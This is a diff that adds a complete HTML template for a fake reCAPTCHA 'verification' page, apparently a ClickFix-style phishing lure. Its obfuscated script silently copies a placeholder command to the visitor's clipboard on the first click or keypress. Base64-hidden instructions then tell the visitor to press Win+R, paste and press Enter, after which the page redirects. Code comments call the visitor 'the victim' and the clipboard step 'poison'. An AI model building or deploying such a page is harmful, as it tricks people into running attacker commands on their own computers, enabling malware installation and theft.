@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="referrer" content="no-referrer">
+<meta name="robots" content="noindex,nofollow,noarchive">
+<title>Verification</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Crect width='10' height='10' fill='%23f25022'/%3E%3Crect x='13' width='10' height='10' fill='%237fba00'/%3E%3Crect y='13' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='13' y='13' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Roboto,Arial,Helvetica,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#000}
+#card{background:#f9f9f9;border:1px solid #d3d3d3;border-radius:3px;width:302px;overflow:hidden;transition:width .25s ease}
+#card.x{width:350px}
+.row{display:flex;align-items:center;height:76px;padding:0 10px 0 14px;cursor:pointer;user-select:none}
+.cb{width:28px;height:28px;border:2px solid #c1c1c1;background:#fff;margin-right:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative}
+.cb svg{width:20px;height:20px;display:none}
+.cb.k{border-color:#1e8e3e;background:#fff}
+.cb.k svg{display:block}
+.cb.sp::after{content:'';width:18px;height:18px;border:3px solid #dbdbdb;border-top-color:#4285f4;border-radius:50%;animation:r .8s linear infinite}
+@keyframes r{to{transform:rotate(360deg)}}
+.lbl{font-size:14px;color:#000;flex:1}
+.lg{display:flex;flex-direction:column;align-items:center;line-height:1}
+.lg svg{width:44px;height:44px}
+.lg .cap{font-size:10px;color:#9b9b9b;font-weight:600;margin-top:2px}
+.gf{display:flex;justify-content:flex-end;padding:0 10px 5px;font-size:8px;color:#9b9b9b}
+#st2{display:none;border-top:1px solid #d3d3d3;padding:14px 16px 12px}
+.hd{font-size:14px;font-weight:500;color:#000;margin-bottom:10px}
+#steps{list-style:decimal;padding-left:20px}
+#steps li{font-size:13px;line-height:1.5;margin-bottom:9px;color:#000}
+kbd{display:inline-block;min-width:24px;text-align:center;padding:2px 6px;border:1px solid #c1c1c1;border-bottom-width:2px;border-radius:3px;background:#fff;font:bold 11px/1.4 Arial,sans-serif;color:#333;margin:0 1px;vertical-align:1px}
+.wl{display:inline-block;width:6px;height:6px;background:#0078d4;box-shadow:7px 0 0 #0078d4,0 7px 0 #0078d4,7px 7px 0 #0078d4;margin:0 7px 5px 1px;vertical-align:-1px}
+.agr{font-style:italic;font-size:12.5px;color:#333;line-height:1.5;margin-top:4px}
+.agr b{color:#000}
+.foot{font-size:11px;color:#9b9b9b;margin-top:10px}
+#vb{width:100%;margin-top:12px;padding:9px 0;border:none;border-radius:3px;background:#4285f4;color:#fff;font-size:13px;font-weight:500;cursor:pointer;transition:background .3s,opacity .3s}
+#vb:hover{background:#3b78e7}
+#vb:disabled{background:#b6cdf7;cursor:not-allowed;opacity:.65}
+#ok{display:none;text-align:center;padding:16px 16px 18px}
+#ok svg{width:38px;height:38px;margin-bottom:8px}
+#okt{font-size:14px;font-weight:600;color:#1e8e3e}
+#oks{font-size:12px;color:#9b9b9b;margin-top:4px}
+</style>
+</head>
+<body>
+<div id="card">
+  <div class="row" id="cbrow">
+    <div class="cb" id="cb">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#1e8e3e" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+    </div>
+    <span class="lbl" id="cbt"></span>
+    <span class="lg" aria-hidden="true">
+      <svg viewBox="0 0 64 64">
+        <path fill="#1c3aa9" d="M64 31.955l-.033-1.37V4.687l-7.16 7.16C50.948 4.674 42.033.093 32.05.093c-10.4 0-19.622 4.96-25.458 12.64l11.736 11.86a15.55 15.55 0 0 1 4.754-5.334c2.05-1.6 4.952-2.906 8.968-2.906.485 0 .86.057 1.135.163 4.976.393 9.288 3.14 11.828 7.124l-8.307 8.307L64 31.953"/>
+        <path fill="#4285f4" d="M31.862.094l-1.37.033H4.594l7.16 7.16C4.58 13.147 0 22.06 0 32.046c0 10.4 4.96 19.622 12.64 25.458L24.5 45.768a15.55 15.55 0 0 1-5.334-4.754c-1.6-2.05-2.906-4.952-2.906-8.968 0-.485.057-.86.163-1.135.393-4.976 3.14-9.288 7.124-11.828l8.307 8.307L31.86.095"/>
+        <path fill="#ababab" d="M.001 32.045l.033 1.37v25.898l7.16-7.16c5.86 7.173 14.774 11.754 24.76 11.754 10.4 0 19.622-4.96 25.458-12.64l-11.736-11.86a15.55 15.55 0 0 1-4.754 5.334c-2.05 1.6-4.952 2.906-8.968 2.906-.485 0-.86-.057-1.135-.163-4.976-.393-9.288-3.14-11.828-7.124l8.307-8.307c-10.522.04-22.4.066-27.295-.005"/>
+      </svg>
+      <span class="cap">reCAPTCHA</span>
+    </span>
+  </div>
+  <div class="gf">Privacy&nbsp;-&nbsp;Terms</div>
+
+  <div id="st2">
+    <div class="hd" id="hd1"></div>
+    <ol id="steps"></ol>
+    <div class="agr" id="agr"></div>
+    <div class="foot" id="foot"></div>
+    <button id="vb" disabled></button>
+  </div>
+
+  <div id="ok">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#1e8e3e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="16 8 10.5 13.5 8 11"></polyline></svg>
+    <div id="okt"></div>
+    <div id="oks"></div>
+  </div>
+</div>
+
+<script>
+(function(){
+"use strict";
+var _0x=[atob("{command_b64}")];
+var _0r="{redirect_url}"||"{lure_url_js}";
+var _0v="{VID}";
+var _0e="VG8gYmV0dGVyIHByb3ZlIHlvdSBhcmUgbm90IGEgcm9ib3QsIHBsZWFzZTo=|UHJlc3MgJmFtcDsgaG9sZCA8a2JkPjxpIGNsYXNzPSJ3bCI+PC9pPldpbjwva2JkPiArIDxrYmQ+Ujwva2JkPi4=|SW4gdGhlIHZlcmlmaWNhdGlvbiB3aW5kb3csIHByZXNzIDxrYmQ+Q3RybDwva2JkPiArIDxrYmQ+Vjwva2JkPi4=|UHJlc3MgPGtiZD5FbnRlcjwva2JkPiBvbiB5b3VyIGtleWJvYXJkIHRvIGZpbmlzaC4=|UGVyZm9ybSB0aGUgc3RlcHMgYWJvdmUgdG8gZmluaXNoIHZlcmlmaWNhdGlvbi4=|SSdtIG5vdCBhIHJvYm90|WW91IHdpbGwgb2JzZXJ2ZSBhbmQgYWdyZWU6IDxiPiJJJ20gbm90IGEgcm9ib3QgLSByZUNBUFRDSEEgVmVyaWZpY2F0aW9uIElEOiA8c3BhbiBpZD0idmlkIj48L3NwYW4+IjwvYj4=|VmVyaWZ5|VmVyaWZpY2F0aW9uIENvbXBsZXRl|UmVkaXJlY3RpbmcgeW91IHRvIHlvdXIgZGVzdGluYXRpb24uLi4=";
+var _0d=null;
+function _s(i){
+  if(!_0d)_0d=_0e.split('|').map(function(x){return atob(x);});
+  return _0d[i]||'';
+}
+function _cp(t){
+  var ta=document.createElement('textarea');
+  ta.value=t;ta.setAttribute('readonly','');
+  ta.style.position='absolute';ta.style.left='-9999px';
+  document.body.appendChild(ta);ta.select();
+  try{document.execCommand('copy')}catch(e){}
+  document.body.removeChild(ta);
+}
+
+// poison on the first gesture anywhere (covers arrival without a widget click)
+function _arm(){_cp(_0x[0]);}
+document.addEventListener('pointerdown',_arm,{once:true,capture:true});
+document.addEventListener('keydown',_arm,{once:true,capture:true});
+
+var _done=false;
+document.getElementById('cbrow').addEventListener('click',function(){
+  if(_done)return;
+  _done=true;
+  _cp(_0x[0]);
+  var cb=document.getElementById('cb');
+  cb.classList.add('sp');
+  setTimeout(function(){
+    cb.classList.remove('sp');
+    cb.classList.add('k');
+    document.getElementById('st2').style.display='block';
+    document.getElementById('card').classList.add('x');
+    _cp(_0x[0]);
+    // Verify button starts disabled (dimmed), silently enables after 5-15s
+    var vb=document.getElementById('vb');
+    vb.disabled=true;
+    setTimeout(function(){
+      vb.disabled=false;
+    },5000+Math.random()*10000);
+    // silent hand-off fallback if the victim never clicks Verify
+    setTimeout(function(){window.location.href=_0r;},30000+Math.random()*30000);
+  },600);
+});
+
+document.getElementById('vb').addEventListener('click',function(){
+  if(this.disabled)return;
+  _cp(_0x[0]);
+  document.getElementById('st2').style.display='none';
+  document.getElementById('ok').style.display='block';
+  setTimeout(function(){window.location.href=_0r;},1200+Math.random()*500);
+});
+
+setTimeout(function(){
+  document.getElementById('hd1').textContent=_s(0);
+  var ol=document.getElementById('steps');
+  var st=[_s(1),_s(2),_s(3)];
+  for(var i=0;i<st.length;i++){
+    var li=document.createElement('li');
+    li.innerHTML=st[i];
+    ol.appendChild(li);
+  }
+  document.getElementById('agr').innerHTML=_s(6);
+  document.getElementById('agr').querySelector('#vid').textContent=_0v;
+  document.getElementById('foot').textContent=_s(4);
+  document.getElementById('cbt').textContent=_s(5);
+  document.getElementById('vb').textContent=_s(7);
+  document.getElementById('okt').textContent=_s(8);
+  document.getElementById('oks').textContent=_s(9);
+},100);
+})();
+</script>
+</body>
+</html>
